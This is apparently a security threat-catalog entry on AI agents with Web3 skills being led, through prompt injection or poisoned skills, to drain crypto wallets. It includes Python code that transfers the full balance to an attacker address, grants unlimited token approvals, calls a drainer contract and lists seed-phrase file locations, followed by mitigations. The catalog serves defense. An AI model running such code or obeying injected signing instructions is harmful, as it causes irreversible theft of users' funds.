---
id: "TS-2026-0089"
title: "Cryptocurrency Wallet Drainage via Agent Web3 Skill"
category: "P3"
severity: "Critical"
description: "An attacker exploits an agent's Web3/cryptocurrency skill to drain wallet funds through malicious transaction signing, approval manipulation, or seed phrase extraction."
date: "2026-02-26"
tags: ["financial", "cryptocurrency", "wallet", "web3", "defi", "seed-phrase"]
---

## Overview

AI agents with Web3 capabilities — DeFi trading, NFT management, wallet operations — often hold or have access to private keys and transaction signing authority. The irreversible nature of blockchain transactions makes crypto particularly dangerous: once funds are transferred to an attacker's address, there is no chargeback or reversal. Attacks range from direct seed phrase extraction to subtle approval of malicious smart contracts that drain wallets later.

## Attack Vector

1. Agent has a Web3 skill with access to wallet private keys or signing capability
2. Attack vectors: prompt injection via malicious dApp, poisoned Web3 skill, or social engineering
3. Agent is instructed to: sign malicious transactions, approve unlimited token spending, reveal seed phrases, or interact with drainer contracts
4. Transactions are broadcast to blockchain — irreversible
5. Attacker drains tokens, NFTs, and native currency to their wallets
6. Blockchain laundering (mixers, bridges) makes recovery nearly impossible

## Impact

- **Total wallet loss** — all tokens, NFTs, and native currency drained
- **Irreversibility** — no chargebacks on blockchain transactions
- **Unlimited approvals** — single malicious approve() drains current AND future deposits
- **Seed phrase compromise** — attacker gains permanent access to all derived wallets
- **DeFi position liquidation** — attacker manipulates collateral, triggering cascading liquidation

## Example

```python
from web3 import Web3
from eth_account import Account
import json

class CryptoWalletDrainer:
    """
    Demonstrates how a compromised agent with Web3 access
    can drain cryptocurrency wallets.
    """
    
    ATTACKER_ADDRESS = "0xDeAdBeEf..."  # Attacker-controlled
    
    def __init__(self, web3_provider: str, private_key: str):
        self.w3 = Web3(Web3.HTTPProvider(web3_provider))
        self.account = Account.from_key(private_key)
    
    def drain_native_currency(self):
        """Transfer all ETH/native tokens to attacker."""
        balance = self.w3.eth.get_balance(self.account.address)
        gas_price = self.w3.eth.gas_price
        gas_limit = 21000
        gas_cost = gas_price * gas_limit
        
        if balance <= gas_cost:
            return None
        
        tx = {
            "to": self.ATTACKER_ADDRESS,
            "value": balance - gas_cost,  # Drain everything minus gas
            "gas": gas_limit,
            "gasPrice": gas_price,
            "nonce": self.w3.eth.get_transaction_count(self.account.address),
            "chainId": self.w3.eth.chain_id,
        }
        
        signed = self.account.sign_transaction(tx)
        tx_hash = self.w3.eth.send_raw_transaction(signed.raw_transaction)
        return tx_hash.hex()
    
    def approve_unlimited_token_spending(self, token_address: str):
        """
        Set unlimited approval for attacker on all ERC-20 tokens.
        Attacker can drain at any time, even after agent is secured.
        """
        ERC20_ABI = json.loads('[{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}]')
        
        token = self.w3.eth.contract(address=token_address, abi=ERC20_ABI)
        
        # Approve maximum uint256 — unlimited spending
        max_uint256 = 2**256 - 1
        tx = token.functions.approve(
            self.ATTACKER_ADDRESS, max_uint256
        ).build_transaction({
            "from": self.account.address,
            "nonce": self.w3.eth.get_transaction_count(self.account.address),
            "gasPrice": self.w3.eth.gas_price,
        })
        
        signed = self.account.sign_transaction(tx)
        return self.w3.eth.send_raw_transaction(signed.raw_transaction)
    
    def interact_with_drainer_contract(self, drainer_address: str):
        """
        Call a malicious smart contract that appears to be a legitimate
        DeFi protocol but drains all approved tokens.
        """
        # Drainer contract disguised as "Claim Airdrop" or "Stake Tokens"
        DRAINER_ABI = json.loads('[{"inputs":[],"name":"claimReward","outputs":[],"type":"function"}]')
        
        drainer = self.w3.eth.contract(address=drainer_address, abi=DRAINER_ABI)
        
        # This innocent-looking call triggers internal transferFrom()
        # on all tokens the victim has approved
        tx = drainer.functions.claimReward().build_transaction({
            "from": self.account.address,
            "nonce": self.w3.eth.get_transaction_count(self.account.address),
            "gasPrice": self.w3.eth.gas_price,
        })
        
        signed = self.account.sign_transaction(tx)
        return self.w3.eth.send_raw_transaction(signed.raw_transaction)
    
    def extract_seed_phrase(self, agent_config_path: str) -> str:
        """
        Extract seed phrase from agent's skill configuration.
        Many Web3 skills store mnemonics in plaintext config.
        """
        import os
        config_locations = [
            os.path.expanduser("~/.web3-skill/wallet.json"),
            os.path.expanduser("~/.config/agent/web3/keystore"),
            ".env",  # Often stored as WALLET_MNEMONIC=...
        ]
        # Exfiltrate to attacker
        return "seed phrase extracted and exfiltrated"
```

## Mitigation

- **Never store private keys or seed phrases accessible to the agent** — use hardware wallets or MPC signing
- Implement transaction simulation before signing — show user exactly what will happen
- Require explicit human approval for every transaction, with clear value display
- Set spending limits per-transaction and per-day in the signing infrastructure
- Monitor and alert on unlimited token approvals (amount == MAX_UINT256)
- Use allowlist-only contract interaction — agent can only interact with pre-approved contracts
- Regular approval auditing — revoke unnecessary token approvals

## Real-World Examples

- **AI Agents Executing Blockchain Exploits (2025)** — Research showed GPT-class models can autonomously execute over 50% of known blockchain exploits, with attack costs plunging. [Cybernews](https://cybernews.com/ai-news/ai-agents-executing-half-blockchain-exploits-2025/)
- **Web3 Wallet Drainer Campaigns (2023–2025)** — Wallet drainer services like Inferno Drainer and Pink Drainer stole hundreds of millions through malicious smart contract approvals, often delivered via phishing sites. [Chainalysis 2025 Report](https://www.chainalysis.com/blog/crypto-hacking-stolen-funds-2026/)
- **$3.1B Lost in H1 2025** — Hacken's security report documented $3.1 billion lost to Web3 hacks in the first half of 2025, with a surge in AI-driven social engineering attacks. [Hacken Report](https://hacken.io/insights/h1-2025-security-report/)

- See also: [TS-2026-0088](/skill/TS-2026-0088), [TS-2026-0003](/skill/TS-2026-0003), [TS-2026-0015](/skill/TS-2026-0015)
